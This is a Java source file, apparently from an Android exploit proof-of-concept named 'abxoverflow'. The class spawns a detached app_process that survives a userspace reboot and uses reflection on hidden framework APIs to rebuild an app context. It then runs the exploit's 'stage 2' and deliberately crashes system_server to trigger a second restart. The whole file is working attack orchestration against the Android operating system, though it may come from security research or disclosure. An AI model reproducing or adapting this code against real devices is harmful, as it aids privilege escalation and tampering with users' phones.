package com.example.abxoverflow;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.os.Looper;
import android.os.Parcel;
import android.system.Os;
import android.util.Base64;
import android.util.Log;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

/**
 * This is separate process that runs in background during first userspace reboot.
 *
 * Once system is ready it executes stage 2 and triggers second restart
 */
public class RebootBackgroundRunner {

    public static final String TAG = "BackRun";

    static void start(Context context) throws IOException {
        // Pass ApplicationInfo object as argument to newly launched process
        Parcel parcel = Parcel.obtain();
        context.getApplicationInfo().writeToParcel(parcel, 0);
        String appInfo = Base64.encodeToString(parcel.marshall(), 0);
        parcel.recycle();

        ProcessBuilder processBuilder = new ProcessBuilder(
                "/system/bin/app_process",
                "/",
                RebootBackgroundRunner.class.getName(),
                appInfo
        );
        processBuilder.environment().put("CLASSPATH", context.getApplicationInfo().sourceDir);
        processBuilder.start();
    }

    public static void main(String[] args) throws Exception {
        // Survive userspace reboot
        Os.setsid();

        // Wait for ServiceManager.getService("activity") to disappear and reappear
        Method getService = Class.forName("android.os.ServiceManager").getMethod("getService", String.class);
        Object origAmBinder = getService.invoke(null, "activity");
        while (true) {
            Log.v("BackRun", "Waiting for new activity service");
            Object amBinder = getService.invoke(null, "activity");
            if (amBinder != null && amBinder != origAmBinder) {
                break;
            }
            Thread.sleep(2000);
        }

        Log.v(TAG, "Seen new activity service");

        // Read ApplicationInfo provided by app launching this background process
        ApplicationInfo applicationInfo;
        {
            Parcel parcel = Parcel.obtain();
            byte[] data = Base64.decode(args[0], 0);
            parcel.unmarshall(data, 0, data.length);
            parcel.setDataPosition(0);
            applicationInfo = ApplicationInfo.CREATOR.createFromParcel(parcel);
            parcel.recycle();
        }

        // Create Context
        Looper.prepareMainLooper();
        Class<?> atClass = Class.forName("android.app.ActivityThread");
        Constructor<?> atConstructor = atClass.getDeclaredConstructor();
        atConstructor.setAccessible(true);
        Object at = atConstructor.newInstance();
        Method gpiMethod = atClass.getDeclaredMethod("getPackageInfoNoCheck", ApplicationInfo.class);
        gpiMethod.setAccessible(true);
        Object pi = gpiMethod.invoke(at, applicationInfo);
        Method createAppContext = Class.forName("android.app.ContextImpl").getDeclaredMethod("createAppContext", atClass, pi.getClass());
        createAppContext.setAccessible(true);
        Context context = (Context) createAppContext.invoke(null, at, pi);
        Log.v("BackRun", "context=" + context);

        // Wait for getSharedPreferences to stop throwing exception
        while (true) {
            try {
                context.getSharedPreferences("a", Context.MODE_PRIVATE);
                break;
            } catch (Exception e) {}
            Log.v("BackRun", "Waiting for SharedPreferences");
            Thread.sleep(2000);
        }
        Log.v("BackRun", "SharedPreferences ready");

        // Perform stage 2
        Main.stage2(context);
        Main.crashSystemServer();

        Log.v("BackRun", "Exiting");
    }
}
